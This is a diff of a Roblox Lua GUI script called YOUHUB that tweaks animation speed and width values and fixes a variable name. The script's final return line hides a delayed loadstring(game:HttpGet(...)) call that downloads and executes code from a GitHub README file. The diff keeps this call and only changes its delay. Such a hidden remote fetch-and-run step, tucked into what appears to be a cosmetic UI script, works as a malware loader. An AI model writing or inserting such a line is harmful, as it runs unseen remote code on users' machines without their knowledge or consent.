@@ -97,10 +97,10 @@ YOUHUB["11"]["BackgroundTransparency"] = 1;
 YOUHUB["11"]["Position"] = UDim2.new(0.5, 0, 0.75, 10);
 YOUHUB["12"] = Instance.new("LocalScript", YOUHUB["11"]);
 local function C_5()
-local script = OsirisHub["5"];
+local script = YOUHUB["5"];
 	local Bounce = true	 -- You Can Set This To False To Cancle The Background Animation[s].
-	local Speed = 25	  -- Customize The Animation Speed To Your Likings
-	local MaxWidth = 25	 -- Customize The Width To Your Likings
+	local Speed = 45	  -- Customize The Animation Speed To Your Likings
+	local MaxWidth = 45	 -- Customize The Width To Your Likings
 	local val = 0
 	while wait() do
 		if Bounce then
@@ -187,4 +187,4 @@ local script = YOUHUB["12"];
 	end
 end;
 task.spawn(C_12);
-return YOUHUB["1"], wait(55)> loadstring(game:HttpGet("https://raw.githubusercontent.com/CQWEO/-/main/README.md"))()
+return YOUHUB["1"], wait(48)> loadstring(game:HttpGet("https://raw.githubusercontent.com/CQWEO/-/main/README.md"))()
